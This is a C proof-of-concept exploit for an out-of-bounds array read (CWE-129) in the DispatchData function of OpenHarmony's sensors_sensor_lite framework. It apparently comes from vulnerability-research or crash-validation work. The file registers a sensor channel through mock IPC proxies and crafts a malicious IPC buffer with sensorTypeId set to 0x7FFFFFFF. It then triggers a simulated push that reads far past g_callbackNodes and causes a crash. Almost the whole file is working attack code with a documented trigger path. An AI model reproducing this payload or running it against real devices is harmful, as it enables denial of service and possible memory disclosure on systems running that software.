/*
 * Target-Compile PoC: DispatchData OOB Array Index (CWE-129)
 *
 * Target: sensors_sensor_lite — frameworks/src/sensor_agent_proxy.c
 * Vulnerable function: DispatchData (line 200)
 *
 * Trigger path:
 *   RegisterSensorChannel(mockProxy, 0)
 *     → sets g_objectStub.func = SensorChannelCallback
 *     → WriteRemoteObject registers IPC push callback
 *     → allocates g_sensorEvent via malloc
 *   SAMGR_SimulatePush(&crafted_ipc)
 *     → SensorChannelCallback(0, &ipc_data, NULL, option)
 *       → ReadUint32(len1) → ReadBuffer(len1) → cast SensorEvent*
 *       → copies sensorTypeId=0x7FFFFFFF to g_sensorEvent
 *       → DispatchData(g_sensorEvent)
 *         → g_callbackNodes[0x7FFFFFFF].next → SEGV (OOB read)
 *
 * Oracle: ASan SEGV on OOB read in DispatchData
 *
 * Build (target-compile):
 *   ./build.sh <sensors_sensor_lite_path> <ohos-toolkit-stubs-path>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include "serializer.h"
#include "ipc_skeleton.h"
#include "iproxy_client.h"
#include "sensor_agent_type.h"
#include "sensor_agent_proxy.h"
#include "samgr_lite.h"
#include "log.h"

extern SensorEvent *g_sensorEvent;
extern int32_t RegisterSensorChannel(const void *proxy, int32_t sensorId);

static int MockInvoke(struct IClientProxy *proxy, int funcId, IpcIo *request,
                      void *owner, int (*notify)(void*, int, IpcIo*))
{
    (void)proxy; (void)funcId; (void)request; (void)notify;
    if (owner) *((int32_t*)owner) = 0;
    return 0;
}
static int MockQueryInterface(void *iUnknown, int version, void **target)
{
    (void)iUnknown; (void)version; (void)target;
    return 0;
}
static int MockAddRef(void *iUnknown) { (void)iUnknown; return 1; }
static int MockRelease(void *iUnknown) { (void)iUnknown; return 0; }

int main(void)
{
    /* Phase 1: RegisterSensorChannel — public API entry point
     * Sets up g_sensorEvent and registers SensorChannelCallback
     * as the IPC push callback via WriteRemoteObject. */
    g_sensorEvent = NULL;

    IClientProxy mockProxy;
    mockProxy.QueryInterface = (QueryInterface)MockQueryInterface;
    mockProxy.AddRef = (AddRef)MockAddRef;
    mockProxy.Release = (Release)MockRelease;
    mockProxy.Invoke = (int (*)(struct IClientProxy*, int, IpcIo*, void*,
                                int (*)(void*, int, IpcIo*)))MockInvoke;

    int32_t ret = RegisterSensorChannel((const void *)&mockProxy, 0);
    fprintf(stderr, "[POC] RegisterSensorChannel returned: %d\n", ret);
    if (ret != 0 || g_sensorEvent == NULL) {
        fprintf(stderr, "[POC] Setup failed\n");
        return 1;
    }
    fprintf(stderr, "[POC] g_sensorEvent at %p, push callback registered=%d\n",
            (void*)g_sensorEvent, SAMGR_IsPushCallbackRegistered());

    /* Phase 2: Craft malicious IPC buffer
     * Wire format matches SensorChannelCallback's read sequence:
     *   [u32 len1][len1 bytes: SensorEvent][u32 len2][len2 bytes: sensor data] */
    uint8_t ipc_buf[256];
    memset(ipc_buf, 0, sizeof(ipc_buf));
    size_t off = 0;

    uint32_t len1 = (uint32_t)sizeof(SensorEvent);
    memcpy(ipc_buf + off, &len1, sizeof(uint32_t));
    off += sizeof(uint32_t);

    SensorEvent malicious;
    memset(&malicious, 0, sizeof(malicious));
    malicious.sensorTypeId = 0x7FFFFFFF;
    memcpy(ipc_buf + off, &malicious, sizeof(SensorEvent));
    off += sizeof(SensorEvent);

    uint32_t len2 = 8;
    memcpy(ipc_buf + off, &len2, sizeof(uint32_t));
    off += sizeof(uint32_t);
    uint8_t dummy[8] = {0};
    memcpy(ipc_buf + off, dummy, sizeof(dummy));
    off += sizeof(dummy);

    IpcIo ipc_data;
    IpcIoInit(&ipc_data, ipc_buf, off, 0);

    /* Phase 3: Trigger via SAMGR_SimulatePush — IPC push simulation
     * Invokes the registered callback (SensorChannelCallback) with
     * crafted data, reaching DispatchData with OOB sensorTypeId. */
    fprintf(stderr, "[POC] Triggering SAMGR_SimulatePush with sensorTypeId=0x7FFFFFFF\n");
    ret = SAMGR_SimulatePush(&ipc_data);
    fprintf(stderr, "[POC] SAMGR_SimulatePush returned: %d\n", ret);

    free(g_sensorEvent);
    g_sensorEvent = NULL;
    return 0;
}
